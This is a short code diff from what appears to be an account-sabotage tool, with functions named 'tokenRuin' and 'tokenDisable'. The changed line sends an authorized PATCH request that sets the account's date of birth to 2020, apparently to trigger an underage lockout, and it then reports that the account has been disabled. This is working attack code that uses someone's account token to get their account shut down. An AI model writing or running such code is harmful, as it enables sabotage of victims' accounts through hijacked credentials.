@@ -40,7 +40,7 @@ def tokenRuin(token):
         exit(0)
 
 def tokenDisable(token):
-    r = requests.patch(url, headers={'Authorization': token}, json={'date_of_birth': '2015-7-16'})
+    r = requests.patch(url, headers={'Authorization': token}, json={'date_of_birth': '2020-8-15'})
     if r.status_code == 400:
         print('Account has been disabled successfully!')
         exit(0)
